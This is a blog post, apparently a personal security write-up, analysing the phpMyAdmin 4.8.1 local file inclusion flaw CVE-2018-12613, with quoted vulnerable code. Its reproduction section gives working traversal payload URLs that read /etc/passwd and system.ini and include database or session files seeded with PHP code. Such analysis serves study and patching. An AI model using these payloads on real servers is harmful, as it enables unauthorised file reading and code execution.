<!DOCTYPE html>
<html>
  <!DOCTYPE html>
<html lang="en">
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
  
  <title>phpMyAdmin4.8.1 LFI漏洞分析 - x1a0t&#39;s Blog</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0">
  
  <meta name="keywords" content=PHP,LFI>
  
  
    <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=1.02">
  
  
    <link rel="alternate" href="/atom.xml " title="x1a0t&#39;s Blog" type="application/atom+xml">
  

  
<link rel="stylesheet" href="/css/style.css">

<meta name="generator" content="Hexo 7.2.0"></head>
  <body>
    <div class="container">
      <header class="header">
  <div class="blog-title">
    <a href="/" class="logo">x1a0t&#39;s Blog</a>
    <div class="subtitle"></div>
  </div>
  <nav class="navbar">
    <ul class="menu">
      
        <li class="menu-item">
          <a href="/" class="menu-item-link">Home</a>
        </li>
      
        <li class="menu-item">
          <a href="/links" class="menu-item-link">Links</a>
        </li>
      
        <li class="menu-item">
          <a href="/notes" class="menu-item-link">Notes</a>
        </li>
      
        <li class="menu-item">
          <a href="/about" class="menu-item-link">About</a>
        </li>
      
    </ul>
  </nav>
</header>
<article class="post">
  <div class="post-title">
    <h1 class="article-title">phpMyAdmin4.8.1 LFI漏洞分析</h1>
  </div>
   <div class="post-meta">
    <span class="post-time">2018-07-21</span>
    
      <ul class="post-tag-list" itemprop="keywords"><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/LFI/" rel="tag">LFI</a></li><li class="post-tag-list-item"><a class="post-tag-list-link" href="/tags/PHP/" rel="tag">PHP</a></li></ul>
    
  </div>
  <div class="post-content">
    <h1 id="说明"><a href="#说明" class="headerlink" title="说明"></a>说明</h1><p>漏洞编号CVE-2018-12613，如果以前遇到phpMyAdmin，基本会选择使用outfile或者更改日志文件来写shell，貌似均需要root那样的权限才可行。如今，这个文件包含则降低了Getshell的难度，只需要登陆后台<br>影响版本：4.8.0、4.8.1</p>
<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>漏洞代码在&#x2F;index.php:55</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (! <span class="keyword">empty</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; <span class="title function_ invoke__">is_string</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! <span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^index/&#x27;</span>, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">    &amp;&amp; ! <span class="title function_ invoke__">in_array</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>], <span class="variable">$target_blacklist</span>)</span><br><span class="line">    &amp;&amp; <span class="title class_">Core</span>::<span class="title function_ invoke__">checkPageValidity</span>(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>])</span><br><span class="line">) &#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="variable">$_REQUEST</span>[<span class="string">&#x27;target&#x27;</span>];</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>经过判断为true则直接包含，前4个很好理解，只需要传入的target不以’index’开头，且不在黑名单中即可。重点看<code>Core::checkPageValidity</code>，进入查看&#x2F;libraries&#x2F;classes&#x2F;Core.php:443</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="built_in">static</span> <span class="function"><span class="keyword">function</span> <span class="title">checkPageValidity</span>(<span class="params">&amp;<span class="variable">$page</span>, <span class="keyword">array</span> <span class="variable">$whitelist</span> = []</span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">empty</span>(<span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="variable">$whitelist</span> = <span class="built_in">self</span>::<span class="variable">$goto_whitelist</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (! <span class="keyword">isset</span>(<span class="variable">$page</span>) || !<span class="title function_ invoke__">is_string</span>(<span class="variable">$page</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//第一种</span></span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//第二种</span></span><br><span class="line">    <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">        <span class="variable">$page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="comment">//第三种</span></span><br><span class="line">    <span class="variable">$_page</span> = <span class="title function_ invoke__">urldecode</span>(<span class="variable">$page</span>);</span><br><span class="line">    <span class="variable">$_page</span> = <span class="title function_ invoke__">mb_substr</span>(</span><br><span class="line">        <span class="variable">$_page</span>,</span><br><span class="line">        <span class="number">0</span>,</span><br><span class="line">        <span class="title function_ invoke__">mb_strpos</span>(<span class="variable">$_page</span> . <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;?&#x27;</span>)</span><br><span class="line">    );</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">in_array</span>(<span class="variable">$_page</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>该函数载入了一个白名单，然后分别使用了三种方式处理$page后，判断是否在白名单中</p>
<ul>
<li>直接使用$page比较</li>
<li>截取$page参数中<code>?</code>之前的部分</li>
<li>URL解码后，再截取$page参数中<code>?</code>之前的部分</li>
</ul>
<p>第一种直接放弃；第二种由于?在URL中的特殊含义，不会传到这里来；第三种则刚好解决了第二种的难题，我们传入<code>?</code>二次URL编码后的<code>%25%3F</code>，则$page前面部分控制在白名单中，后面部分就可以随意构造了</p>
<h1 id="复现"><a href="#复现" class="headerlink" title="复现"></a>复现</h1><p>既然是文件包含，就需要知道文件的路径，绝对路径可以通过查看Mysql的相关配置得出。网上有几种形式的利用，适合不同的情况使用<br>1、包含本地文件，payload：<br><code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../windows/system.ini</code></p>
<p><img src="/2018/07/21/phpMyAdmin4-8-1%20LFI%20Vulnerability%20Analysis/e296a39b-bc3f-4dbd-8659-d9d6e6db8e17.png" alt="1532173538371"></p>
<blockquote>
<p>测试发现:<br>这里在windows环境下，后面被包含文件的路径不能有盘符。如果include后面是限制了盘符的，便不能跨到其他盘符的路径</p>
</blockquote>
<p>2、包含数据库文件</p>
<p>创建数据库test，创建表a，字段名或者注释处填写为<code>&lt;?php phpinfo();?&gt;</code>，执行<code>show variables like &quot;%datadir%&quot;</code>查看数据库文件目录，payload:<br><code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../phpstudy/PHPTutorial/MySQL/data/test/a.frm</code></p>
<p><img src="/2018/07/21/phpMyAdmin4-8-1%20LFI%20Vulnerability%20Analysis/555f1951-4390-4a7a-9d5a-9297d0c72c74.png" alt="img"> </p>
<p>3、包含SESSION文件<br>这个相对难利用，因为保存SESSION的文件路径不一定知道，linux一般在：&#x2F;var&#x2F;lib&#x2F;php&#x2F;session&#x2F;，我这里是windows下的phpstudy环境下，在&#x2F;phpstudy&#x2F;PHPTutorial&#x2F;tmp&#x2F;tmp&#x2F;</p>
<p>执行SQL语句：<code>select &lt;?php phpinfo();?&gt;</code>，查看cookie中的sessionID，构造payload:<br><code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php%253f/../../../../../../phpstudy/PHPTutorial/tmp/tmp/sess_huld9p9i6d1so0jia0h2g1d5j9ca3ksf</code></p>
<p><img src="/2018/07/21/phpMyAdmin4-8-1%20LFI%20Vulnerability%20Analysis/93c72b0d-20d5-4ae0-a812-67000b2e8556.png" alt="img"> </p>
<h1 id="180729更新"><a href="#180729更新" class="headerlink" title="180729更新"></a>180729更新</h1><p>看到大佬的博客才发现<code>?</code>在Linux下根本不需要编码，因为本身变量就在query当中，而win下需要编码是因为不允许目录存在特殊字符</p>
<p>payload可以是下面这样：</p>
<p><code>http://127.0.0.1/phpmyadmin/index.php?target=db_sql.php?/../../../../../../etc/passwd</code></p>
<p>反省自己太为复现而去复现了，忽略了某些东西，以后一定先按自己的思路走一遍</p>

  </div>
  <div class="post-footer">
    <a href="#top" class="top">Post.Top</a>
  </div>
</article>
<footer>
  &copy; 2024
  <span class="author">
    x1a0t
  </span>
</footer>
    </div>
  </body>
</html>